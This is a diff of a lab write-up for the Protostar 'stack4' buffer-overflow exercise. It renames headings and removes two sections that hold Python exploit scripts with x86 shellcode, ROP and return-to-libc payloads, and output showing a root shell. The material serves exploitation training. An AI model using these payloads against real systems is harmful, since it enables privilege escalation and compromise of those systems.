@@ -1,6 +1,6 @@
 # stack4
 
-## Solution
+## solution
 ```
 (gdb) r
 Starting program: /opt/protostar/bin/stack4 
@@ -24,9 +24,9 @@ code flow successfully changed
 Segmentation fault
 ```
 
-## Shells
+## shells
 
-### Classic
+### classic buffer overflow
 ```py
 import struct
 
@@ -53,7 +53,7 @@ user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack4
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2libc
+### ret2libc
 ```py
 import struct
 
@@ -74,58 +74,7 @@ id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Rop Chain to Shellcode
-```py
-import struct
-
-off = 76
-
-pad = 'A' * off
-
-buf = ''
-buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
-buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
-buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
-
-nop = '\x90' * 0x80
-
-ret = struct.pack('I', 0x0804841e)
-ret += struct.pack('I', 0xbffff7b0 + 0x80) 
-
-print pad + ret + nop + buf
-```
-
-Here it is in action.
-```
-user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack4
-# id
-uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
-```
-
-### Rop Chain to Libc
-```py
-import struct
-
-off = 76
-
-pad = 'A' * off
-
-ret = struct.pack('I', 0x0804841e)
-
-system = struct.pack('I', 0xb7ecffb0)
-bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)
-
-print pad + ret + system + 'AAAA' + bin_sh
-```
-
-Here it is in action.
-```
-user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack4
-id
-uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
-```
-
-### Ret2.text to Shellcode
+### ret2.text to shellcode
 ```py
 import struct
 
@@ -156,7 +105,7 @@ user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack4
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2.text to Libc
+### ret2.text to libc
 ```py
 import struct
 
